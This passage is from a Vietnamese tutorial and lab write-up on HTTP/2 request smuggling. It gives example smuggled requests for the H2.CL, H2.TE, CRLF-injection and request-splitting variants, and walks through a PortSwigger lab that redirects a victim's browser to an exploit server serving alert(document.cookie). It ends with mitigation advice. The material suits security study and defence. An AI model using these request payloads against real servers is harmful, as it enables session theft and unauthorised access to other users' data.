Điểm thú vị là HTTP/2 ban đầu được xem là “an toàn hơn” trước request smuggling, vì giao thức này không xác định độ dài request bằng các header mơ hồ như Content-Length hay Transfer-Encoding theo cách HTTP/1.1 thường làm. Tuy nhiên, trong thực tế, rất nhiều hệ thống vẫn dùng HTTP/2 ở phía client nhưng lại chuyển đổi request xuống HTTP/1.1 khi giao tiếp với back-end. Quá trình này gọi là **HTTP/2 downgrading**.

Chính bước chuyển đổi này tạo ra nhiều bề mặt tấn công mới.

## V. HTTP/2 request smuggling là gì?

Trong HTTP/2, dữ liệu không được gửi dưới dạng text thuần như HTTP/1.1, mà được chia thành nhiều **frame** nhị phân. Mỗi frame có trường độ dài riêng, giúp server biết chính xác cần đọc bao nhiêu byte.

Về lý thuyết, điều này làm request smuggling khó xảy ra hơn, vì attacker không còn dễ tạo ra sự mơ hồ giữa:

`Content-Length`

và:

`Transfer-Encoding: chunked`

Tuy nhiên, vấn đề xuất hiện khi front-end nhận request bằng HTTP/2, sau đó rewrite nó thành HTTP/1.1 để gửi về back-end.

Ví dụ:

`Client --HTTP/2--> Front-end --HTTP/1.1--> Back-end`

Nếu quá trình downgrade này xử lý header không chặt chẽ, attacker có thể lợi dụng để tạo ra request mà front-end và back-end hiểu khác nhau.

## HTTP/2 downgrading

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516230531.png)


HTTP/2 downgrading là quá trình front-end chuyển một request HTTP/2 thành HTTP/1.1.

Việc này rất phổ biến vì nhiều hệ thống muốn hỗ trợ HTTP/2 cho người dùng bên ngoài, nhưng back-end cũ phía sau vẫn chỉ hỗ trợ HTTP/1.1.

Ví dụ HTTP/2 request có dạng logic như sau:

```
:method POST
:path /example
:authority vulnerable-website.com
content-type application/x-www-form-urlencoded
```

Khi downgrade sang HTTP/1.1, nó có thể trở thành:

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
```

Nghe có vẻ bình thường, nhưng nếu attacker chèn thêm các header nhạy cảm như content-length hoặc transfer-encoding, front-end có thể xử lý theo logic HTTP/2, còn back-end lại xử lý theo logic HTTP/1.1. Đây chính là nền tảng của các lỗi H2.CL và H2.TE.



## H2.CL vulnerabilities

H2.CL là biến thể request smuggling xảy ra khi attacker chèn header:

`content-length`

vào request HTTP/2.

Trong HTTP/2, độ dài request vốn được xác định bằng frame length, không cần dựa vào Content-Length. Nhưng khi front-end downgrade request sang HTTP/1.1, nó có thể copy header content-length do attacker cung cấp vào request gửi cho back-end.

Ví dụ phía front-end nhận HTTP/2 request:

```
:method POST
:path /example
:authority vulnerable-website.com
content-type application/x-www-form-urlencoded
content-length 0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10

x=1
```

Front-end dựa vào cơ chế HTTP/2 nên nghĩ request đã kết thúc đúng theo frame. Nhưng khi downgrade xuống HTTP/1.1, back-end nhìn thấy:

`Content-Length: 0`

và cho rằng body của request đầu tiên rỗng. Phần còn lại:

```
GET /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10
```

có thể bị hiểu thành một request mới được smuggle vào back-end.

Nói ngắn gọn: **front-end dùng độ dài của HTTP/2, còn back-end dùng Content-Length của HTTP/1.1**, dẫn đến desync.


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516231856.png)


Ở lab này, ứng dụng bị lỗi **HTTP/2 request smuggling** do front-end server downgrade request từ HTTP/2 xuống HTTP/1.1 nhưng xử lý Content-Length không chặt chẽ.

Mục tiêu của lab là khiến trình duyệt của victim tải và thực thi một file JavaScript độc hại từ exploit server, với payload:

`alert(document.cookie)`

Victim sẽ truy cập trang chủ định kỳ khoảng mỗi 10 giây, vì vậy ta cần smuggle request đúng thời điểm để request của victim bị ảnh hưởng.


## Kiểm tra lỗ hổng

Trong Burp Repeater, cần chuyển request sang HTTP/2:

1. Mở request trong Repeater.
2. Mở panel Inspector.
3. Mở phần Request attributes.
4. Chuyển Protocol sang HTTP/2.

Sau đó gửi thử request:

```
POST / HTTP/2 
Host: YOUR-LAB-ID.web-security-academy.net 
Content-Length: 0 
SMUGGLED
````

Nếu gửi nhiều lần và thấy cứ mỗi request thứ hai trả về 404, điều đó cho thấy back-end đã append request tiếp theo vào prefix SMUGGLED.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516232900.png)


Nói cách khác, ta đã tạo được desync giữa front-end và back-end.


Tiếp theo, kiểm tra endpoint /resources.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516233001.png)

Ở trong phần target thì mình tìm được endpoint resources ,nên mình thử truy cập thì thấy rằng ![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516233055.png)

Thì ta thấy rằng t sẽ được chuyển hướng đến `https://YOUR-LAB-ID.web-security-academy.net/resources/`.

Đây là gadget quan trọng. Nếu ta kiểm soát được header Host trong request đi đến back-end, ta có thể khiến redirect trỏ sang domain khác.

## Smuggle request redirect

Ta tạo một HTTP/2 request có Content-Length: 0, nhưng trong body lại nhét một request HTTP/1.1 

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516234320.png)


Khi front-end downgrade request này xuống HTTP/1.1, back-end sẽ thấy request POST / với Content-Length: 0, nên nó kết thúc request ngay. Phần phía sau:

`GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1`

sẽ bị giữ lại và có thể ảnh hưởng request tiếp theo trên connection.

Nếu thành công, request tiếp theo có thể bị redirect đến host ta kiểm soát.


Truy cập exploit server của lab và cấu hình như sau:

`File path: /resources`

Phần body đặt payload JavaScript:

`alert(document.cookie)`

Sau đó bấm Store.

Ý tưởng là khi victim bị redirect tới exploit server tại /resources/, trình duyệt sẽ tải nội dung JavaScript do ta kiểm soát.


Quay lại Burp Repeater, sửa request smuggled để header Host trỏ đến exploit server:

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516235006.png)


Gửi request vài lần. Nếu response trả về redirect sang exploit server, nghĩa là ta đã kiểm soát được redirect thông qua request smuggling.

Ví dụ response mong muốn sẽ có dạng:

`HTTP/1.1 302 Found Location: https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/`


Trong lab này, /resources là một endpoint có hành vi redirect tự động sang /resources/.

Khi request bị smuggle với header:

`Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`

back-end tạo redirect dựa trên Host header này. Kết quả là victim bị điều hướng sang exploit server.

Nếu thời điểm trúng đúng lúc browser của victim đang import JavaScript resource, payload:

`alert(document.cookie) ` sẽ được thực thi trong trình duyệt victim.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516235250.png)


 Sau khi gửi payload H2.CL vài lần, mình kiểm tra access log trên exploit server. Khi thấy request GET /resources/ với User-Agent chứa Mozilla/5.0 (Victim), điều này chứng minh trình duyệt victim đã bị redirect sang exploit server. Do file /resources trên exploit server chứa payload alert(document.cookie), request này cho thấy JavaScript độc hại đã được tải trong ngữ cảnh victim. Lab sau đó chuyển trạng thái solved.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516235047.png)


Ngoài ra còn 1 vài cách khác khá là hay nhưng vì bài viết cũng dài rồi nên các bạn có thể tự Research và làm thêm nhé. 
## H2.TE vulnerabilities

H2.TE là biến thể xảy ra khi attacker chèn header:

`transfer-encoding: chunked`

vào request HTTP/2.

Theo chuẩn, HTTP/2 không dùng chunked encoding. Vì vậy, nếu front-end thấy header này thì nó nên strip header đó hoặc block request. Nhưng nếu front-end không làm vậy và vẫn downgrade request xuống HTTP/1.1, back-end có thể xử lý Transfer-Encoding: chunked như một request HTTP/1.1 bình thường.

Ví dụ:

```
:method POST
:path /example
:authority vulnerable-website.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Sau khi downgrade, back-end có thể nhận được:

```
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Ở đây, 0 đánh dấu kết thúc chunked body. Phần sau đó có thể bị back-end xử lý như một request mới. Đây chính là request smuggling thông qua HTTP/2 downgrade.

## Hidden HTTP/2 support

Một điểm dễ bị bỏ sót khi test là **hidden HTTP/2 support**.

Thông thường, browser hoặc Burp chỉ dùng HTTP/2 nếu server quảng bá hỗ trợ HTTP/2 thông qua ALPN trong quá trình TLS handshake. Tuy nhiên, có một số server thật ra vẫn hỗ trợ HTTP/2 nhưng cấu hình sai, không advertise đúng.

Kết quả là tester tưởng target chỉ hỗ trợ HTTP/1.1 và bỏ qua toàn bộ bề mặt tấn công liên quan đến HTTP/2.

Trong Burp Repeater, có thể ép request dùng HTTP/2 bằng cách:

1. Vào Settings.
2. Chọn Tools > Repeater.
3. Bật Allow HTTP/2 ALPN override.
4. Trong Repeater, mở Inspector.
5. Ở phần Request attributes, đổi Protocol sang HTTP/2.

Điều này cho phép kiểm tra xem server có hidden HTTP/2 support hay không.

## Response queue poisoning

Response queue poisoning là một kỹ thuật request smuggling nguy hiểm hơn rất nhiều so với việc chỉ capture một request.

Thay vì chỉ làm back-end hiểu sai một request, attacker có thể làm lệch hàng đợi response giữa front-end và back-end. Khi đó, response đáng lẽ thuộc về người dùng A có thể bị gửi nhầm cho attacker hoặc người dùng B.

Nếu khai thác thành công, attacker có thể đánh cắp response chứa dữ liệu nhạy cảm như:

`Set-Cookie`

hoặc nội dung trang tài khoản của người dùng khác.

Mức độ ảnh hưởng có thể rất nghiêm trọng, thậm chí dẫn đến takeover nhiều tài khoản hoặc toàn bộ ứng dụng nếu response chứa thông tin đặc quyền.

## Request smuggling qua CRLF injection

Một kỹ thuật nâng cao khác trong HTTP/2 là lợi dụng CRLF injection.

Trong HTTP/1.1, chuỗi:

`\r\n`

được dùng để phân tách các header. Vì vậy, nếu attacker có thể chèn \r\n vào header, họ có thể tạo ra header mới.

Trong HTTP/2, header không được phân tách bằng ký tự text như HTTP/1.1. Nó là dữ liệu nhị phân, nên \r\n trong giá trị header chỉ là một phần của value, không có ý nghĩa đặc biệt với front-end.

Ví dụ trong HTTP/2:

`foo: bar\r\nTransfer-Encoding: chunked`

Front-end HTTP/2 có thể xem đây chỉ là một header foo có value dài. Nhưng khi downgrade sang HTTP/1.1, back-end có thể thấy:

`Foo: bar Transfer-Encoding: chunked`

Tức là attacker đã chèn được một header mới vào request HTTP/1.1 sau khi downgrade.

Đây là lý do HTTP/2 downgrade có thể mở ra những hướng tấn công mới mà HTTP/1.1 thông thường khó khai thác hơn.

## HTTP/2 request splitting

HTTP/2 request splitting là kỹ thuật tách một request HTTP/2 thành nhiều request HTTP/1.1 sau khi downgrade.

Điểm mạnh của kỹ thuật này là attacker không nhất thiết phải dùng request có body như POST. Ngay cả một request GET cũng có thể bị lợi dụng nếu chèn được CRLF vào header.

Ví dụ ý tưởng:

`:method GET :path / :authority vulnerable-website.com foo: bar\r\n \r\n GET /admin HTTP/1.1\r\n Host: vulnerable-website.com`

Khi downgrade, back-end có thể hiểu đây là hai request riêng biệt:

`GET / HTTP/1.1 Host: vulnerable-website.com Foo: bar`

và:

`GET /admin HTTP/1.1 Host: vulnerable-website.com`

Tuy nhiên, khi thực hiện request splitting, cần chú ý cách front-end rewrite request. Ví dụ, front-end có thể tự thêm header Host ở cuối danh sách header. Nếu split xảy ra trước vị trí đó, request đầu tiên có thể bị thiếu Host, còn request thứ hai lại có dư Host.

Do đó, attacker cần tính toán vị trí header được inject sao cho cả request thật và request smuggled đều hợp lệ với back-end.

## HTTP request tunnelling

HTTP request tunnelling là một hướng khai thác nâng cao hơn, hữu ích trong trường hợp front-end và back-end không tái sử dụng connection.

Nhiều kỹ thuật request smuggling truyền thống phụ thuộc vào việc nhiều request cùng đi qua một connection backend. Nếu connection không được reuse, việc smuggle request trở nên khó hơn.

Request tunnelling giải quyết vấn đề này bằng cách lợi dụng cách server xử lý request và response sớm, từ đó tạo ra kênh để đưa request phụ đi qua request chính. Đây là nền tảng cho một số kỹ thuật hiện đại như 0.CL desync.

## 0.CL request smuggling

0.CL xảy ra khi front-end bỏ qua Content-Length, nhưng back-end lại xử lý nó.

Trước đây, kiểu lỗi này từng được xem là khó khai thác vì dễ gây deadlock: front-end và back-end chờ nhau, không bên nào hoàn tất request.

Tuy nhiên, khi kết hợp với **early-response gadget**, attacker có thể khiến back-end trả response trước khi đọc xong toàn bộ body. Từ đó phá deadlock và tiếp tục tạo desync.

Đây là một kỹ thuật phức tạp hơn, nhưng nó cho thấy request smuggling vẫn còn nhiều biến thể nguy hiểm ngay cả khi các lỗi CL.TE hoặc TE.CL cơ bản đã được vá.

## Tổng kết

Advanced request smuggling cho thấy vấn đề không chỉ nằm ở HTTP/1.1. Khi HTTP/2 được triển khai cùng HTTP/1.1 thông qua cơ chế downgrade, rất nhiều lỗi mới có thể xuất hiện.

Các điểm quan trọng cần nhớ:

1. HTTP/2 tự nó có cơ chế xác định độ dài request khá rõ ràng.
2. Rủi ro lớn xuất hiện khi HTTP/2 bị downgrade sang HTTP/1.1.
3. H2.CL lợi dụng content-length không được validate đúng.
4. H2.TE lợi dụng transfer-encoding: chunked không bị strip/block.
5. CRLF injection trong HTTP/2 có thể biến thành header injection sau khi downgrade.
6. Request splitting có thể tách một request HTTP/2 thành nhiều request HTTP/1.1 ở back-end.
7. Response queue poisoning có thể làm lộ response của người dùng khác.
8. 0.CL và request tunnelling cho thấy request smuggling vẫn còn nguy hiểm ngay cả khi connection reuse không rõ ràng.

Tóm lại, HTTP/2 không tự động làm request smuggling biến mất. Nếu hệ thống downgrade HTTP/2 sang HTTP/1.1 không an toàn, nó thậm chí có thể tạo ra những vector tấn công mạnh hơn so với các kỹ thuật truyền thống.



## VI. Cách phòng ngừa các lỗ hổng tấn công HTTP request smuggling

HTTP Request Smuggling xảy ra khi **front-end server và back-end server hiểu request theo hai cách khác nhau**, dẫn đến việc ranh giới giữa các request bị diễn giải sai lệch. Điều này thường xuất hiện khi một phía xử lý request dựa trên `Content-Length`, trong khi phía còn lại ưu tiên `Transfer-Encoding: chunked`.

Ngoài ra, trong môi trường **HTTP/2**, nhiều hệ thống thường thực hiện **HTTP downgrading** (chuyển request từ HTTP/2 xuống HTTP/1.1 trước khi gửi đến back-end). Nếu việc chuyển đổi này không được xử lý cẩn thận, nó có thể mở ra thêm nhiều biến thể của request smuggling.

Để giảm thiểu rủi ro, có thể áp dụng một số biện pháp sau:

### 1. Sử dụng HTTP/2 end-to-end nếu có thể

Về bản chất, HTTP/2 sử dụng cơ chế frame-based để xác định độ dài request thay vì phụ thuộc vào `Content-Length` hay `Transfer-Encoding`. Điều này giúp loại bỏ phần lớn các ambiguity vốn là nguyên nhân của request smuggling.

Do đó, nếu hạ tầng cho phép, nên triển khai **HTTP/2 xuyên suốt từ client đến back-end** và hạn chế việc downgrade xuống HTTP/1.1.

Trong trường hợp bắt buộc phải downgrade, cần validate request thật chặt chẽ trước khi rewrite sang HTTP/1.1. Ví dụ:

- Từ chối request chứa ký tự newline bất thường trong header
- Reject header name chứa dấu `:`
- Không chấp nhận request method có khoảng trắng hoặc format không hợp lệ
- Loại bỏ các request malformed hoặc có dấu hiệu ambiguity

### 2. Chuẩn hóa request ở front-end và validate lại ở back-end

Một trong những nguyên nhân lớn nhất của request smuggling là **sự không đồng nhất giữa các thành phần xử lý HTTP**.

Front-end nên thực hiện **normalize request** trước khi chuyển tiếp, ví dụ:

- Chỉ chấp nhận một cơ chế xác định body (`Content-Length` hoặc `Transfer-Encoding`)
- Loại bỏ duplicated header bất thường
- Chuẩn hóa line ending và encoding

Trong khi đó, back-end không nên “tin tưởng” request đã được xử lý phía trước. Nếu request vẫn còn ambiguity, tốt nhất là **reject ngay và đóng TCP connection** để tránh connection reuse bị lợi dụng.

### 3. Không giả định rằng request sẽ không có body

Nhiều hệ thống thường giả định rằng các method như `GET`, `HEAD` hoặc một số endpoint nhất định sẽ không bao giờ có request body. Đây chính là nguyên nhân dẫn đến các kỹ thuật như:

- **CL.0 smuggling**
- **Client-side desync attacks**

Vì vậy, server nên luôn xử lý request body một cách nhất quán thay vì dựa vào assumption.

### 4. Đóng connection khi xảy ra lỗi xử lý request

Nếu trong quá trình parse hoặc xử lý request xuất hiện exception ở cấp server, việc tiếp tục reuse connection có thể tạo điều kiện cho attacker poison request queue.

Một biện pháp an toàn là:

> Khi gặp lỗi parsing hoặc request bất thường → đóng connection ngay thay vì giữ lại.

Điều này giúp hạn chế khả năng request tiếp theo bị “dính” dữ liệu còn sót lại từ request trước.

### 5. Nếu dùng proxy, ưu tiên HTTP/2 upstream

Trong hệ thống có **forward proxy hoặc reverse proxy**, nên bật **upstream HTTP/2** nếu có thể.

Lý do là càng ít bước chuyển đổi giao thức (protocol translation), khả năng xảy ra parsing discrepancy càng thấp.

### 6. Hạn chế hoặc tắt connection reuse với back-end

Một số biến thể request smuggling phụ thuộc vào việc **persistent connection / connection reuse** được bật giữa front-end và back-end.

Việc disable reuse hoặc giảm thời gian keep-alive có thể giúp giảm tác động của một số kỹ thuật tấn công.

Tuy nhiên cần lưu ý rằng:

> Đây chỉ là biện pháp giảm thiểu (mitigation), không phải giải pháp triệt để.

Bởi attacker vẫn có thể khai thác các kỹ thuật như **request tunnelling**, ngay cả khi connection reuse đã bị vô hiệu hóa.

### 7. Đồng bộ parser giữa các tầng hệ thống (khuyến nghị thực tế)

Trong thực tế, nhiều lỗ hổng request smuggling xuất hiện do:

- CDN parse request kiểu này
- WAF parse kiểu khác
- Reverse proxy hiểu khác
- Back-end framework lại hiểu theo cách riêng

Nếu có thể, nên sử dụng các thành phần HTTP stack tương thích với nhau hoặc kiểm tra kỹ cách mỗi layer xử lý:

- `Content-Length`
- `Transfer-Encoding`
- duplicate headers
- malformed chunk
- whitespace bất thường

Việc test parser discrepancy định kỳ cũng rất quan trọng, đặc biệt trong các hệ thống microservice hoặc multi-proxy.





## Tài liệu tham khảo 

- [PortSwigger: HTTP Desync Attacks - Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn#demo)
- [PortSwigger: Web Security Academy - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [Google Docs: HTTP Request Smuggling Notes](https://docs.google.com/document/d/1DNkxizhxwmfHnO5xhcqhweZ4P0VdMp1-NbsxihSBRtM/edit?tab=t.0#heading=h.wypu79tk99ql)
